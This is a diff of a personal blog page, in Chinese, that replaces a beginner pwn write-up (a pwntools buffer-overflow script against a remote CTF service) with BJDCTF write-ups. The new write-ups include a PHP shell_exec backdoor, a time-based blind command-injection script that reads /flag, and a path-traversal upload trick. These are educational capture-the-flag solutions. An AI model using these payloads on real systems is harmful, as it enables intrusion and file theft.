@@ -33,7 +33,21 @@
             文章目录
           </p>
           <div class="toc-container hidden lg:block">
-            
+            <ul class="markdownIt-TOC">
+<li><a href="#web">web</a>
+<ul>
+<li><a href="#%E5%B8%AE%E5%B8%AE%E5%B0%8F%E7%BA%A2%E8%8A%B1">帮帮小红花</a></li>
+<li><a href="#gob">gob</a></li>
+</ul>
+</li>
+<li><a href="#misc">misc</a>
+<ul>
+<li><a href="#questionnaire">questionnaire</a></li>
+<li><a href="#bincat">/bin/cat</a></li>
+</ul>
+</li>
+</ul>
+
           </div>
         </div>
       
@@ -78,71 +92,84 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">解决的第一个pwn题目—攻防世界新手区：when_did_you_born</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">第三届BJDCTF菜鸡签到记—持续更新wp</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2020-05-27 / 2 min read
+          2020-05-27 / 3 min read
         </div>
-        
-          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/pwn_adworld_birth.png" alt="">
         
         <div class="post-content yue">
-          <p>开始pwn了，成为pwn手是我毕生的梦想（🙏<br>
-我们简单运行了一下程序，发现就是一个很简单的输入生日和名字的功能<br>
-我们拿到ida里面简单看一波伪代码<br>
-可以看到v5是不能输入1926，但是要想拿到flag还得是1926，二者冲突了<br>
-<img src="https://zhangzy999.github.io//post-images/1590544386227.png" alt="" loading="lazy"><br>
-然后发现前面还有一个v4，并且是危险函数gets，我们可以考虑通过v4覆盖v5的值，让v5的值变成1926从而绕过前面的if判断<br>
-<img src="https://zhangzy999.github.io//post-images/1590544537541.png" alt="" loading="lazy"><br>
-总结思路：首先随便输入一个v5，绕过第一个if判断，然后输入v4，通过v4溢出来覆盖v5，从而达到我们的目的，让程序本身去cat flag，我们也不用搞栈溢出啥的，只是一个单纯的“变量溢出”<br>
-直接写个exp打过去就行</p>
-<pre><code class="language-python">from pwn import *
-p = remote(&quot;124.126.19.106&quot;,&quot;47436&quot;)
+          <p>比赛打的细碎，还好赛后出题人说不是针对新手的，要不然我直接自闭:-(<br>
+直接wp吧，希望第四届排名能够冲击前100</p>
+<h1 id="web">web</h1>
+<h2 id="帮帮小红花">帮帮小红花</h2>
+<p>赛后复现了一波<br>
+这个题目是web里面分数最低的了，但是这个题目很苟<br>
+打开题目就是花里胡哨的页面，总之题目告诉我们php后端就一句话</p>
+<?php shell_exec($_GET['imagin']); ?>
+<p>emm 它只有后门，没有回显的地方，常规思路直接弹个shell玩玩<br>
+我Google了一些发现可以利用服务器解析日志dnslog来达到类似的shell效果<br>
+有一个提供类似服务的网站，还可以一键生成payload（脚本小子狂喜）<br>
+我们直接用dnslog打发现行不通，应该是后端开启了防火墙限制流量之类的（瞎猜的，不过有防火墙是肯定的）或者是服务器没有连接网络<br>
+那么应该是bash盲注了，但是我比赛的时候没有注入出来，后来发现脚本中的路径写错了草-.-||<br>
+题目中提示我们flag在根目录下，我直接简单的改了改之前sql盲注的脚本，一把梭出来就行了</p>
+<pre><code class="language-python">import requests
+import time
 
-offset = 8  #偏移量是8
+url = &quot;http://127.0.0.1/flag.php?imagin=&quot;
+flag = &quot;BJD{&quot;
+flag_list = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789{}&quot;
 
-p.recvuntil(&quot;Birth?&quot;) #这个是到第一个if判断停下来
-p.sendline(&quot;hhh&quot;) #我们随便打个东西进去就行
-
-p.recvuntil(&quot;Name?&quot;)
-birth = 0x786      #0x786 == 1926
-payload = &quot;A&quot;*offset + p64(birth)
-
-p.sendline(payload)
-p.interactive()
+while True :
+    num = 0
+    for i in flag_list :
+        num = num + 1
+        payload = 'grep -e &quot;{}&quot; /flag %26%26 sleep 2'.format(flag + i)
+        #%26是&amp;的url编码，这种特殊字符要经过url编码，要不然打不出来-.-|
+        start_time = time.time()  #设置发送请求之前的时间
+        r = requests.get(url + payload)
+        end_time = time.time()  #设置发送请求之后的时间
+        if end_time - start_time &gt; 0.5 :
+            flag = flag + i
+            print(flag)
+            break
+    if num &gt; 63:
+        #此时已经遍历列表，说明flag已经到达结尾
+        break
 </code></pre>
-<p>然后就拿到了flag<br>
-<img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
+<p>打一下，就能拿到flag了<br>
+<img src="https://zhangzy999.github.io//post-images/1590580947041.PNG" alt="" loading="lazy"></p>
+<h2 id="gob">gob</h2>
+<p>表面是文件上传，其实是目录穿越<br>
+有一个注册功能但是没有卵用，直接注册（或者不注册）到文件上传页面<br>
+尝试上传各种php，都被解析成了文本，各种图片马 .htaccess .user.ini都没用<br>
+雪殇大佬提示目录穿越在bp中改包<br>
+我们打开bp 然后抓包改文件名 改成../../../../flag   然后后面的base64编码的东西解码过了就是flag，感觉比第一题简单，有点儿脑洞的感觉</p>
+<h1 id="misc">misc</h1>
+<h2 id="questionnaire">questionnaire</h2>
+<p>调查问卷，应该是考社工<br>
+Google + 百度识图 基本能出来所有的答案<br>
+还有一个鸭子的不好出，听师傅们说用百度地图可以找到，还把街道名字给列出来了（tql<br>
+其实这题直接f12就出了草<br>
+划水签到题<br>
+由于第一次玩这种题  感觉还挺有意思的  特地保留了一张图片<br>
+<img src="https://zhangzy999.github.io//post-images/1590582813536.png" alt="" loading="lazy"></p>
+<h2 id="bincat">/bin/cat</h2>
+<p>拿到gif  逐帧提取  然后分离下色道 能看出来是二维码<br>
+不会写脚本 直接截图工具手撸  扫描得二维码</p>
 
         </div>
 
-        
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/B0QGlDmK3/">
-            <span class="flex-auto">ctf</span>
-          </a>
-        
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/4WWBpkiIM/">
-            <span class="flex-auto">学习总结与收获</span>
-          </a>
         
 
 
         <div class="flex justify-between py-8">
           
-            <div class="prev-post">
-              <a href="https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/">
-                <h3 class="post-title">
-                  <i class="ri-arrow-left-line"></i>
-                  第三届BJDCTF菜鸡签到记—持续更新wp
-                </h3>
-              </a>
-            </div>
-          
 
           
             <div class="next-post">
-              <a href="https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/">
+              <a href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
                 <h3 class="post-title">
-                  [GXYCTF2019]Ping Ping Ping—os命令总结
+                  解决的第一个pwn题目—攻防世界新手区：when_did_you_born
                   <i class="ri-arrow-right-line"></i>
                 </h3>
               </a>
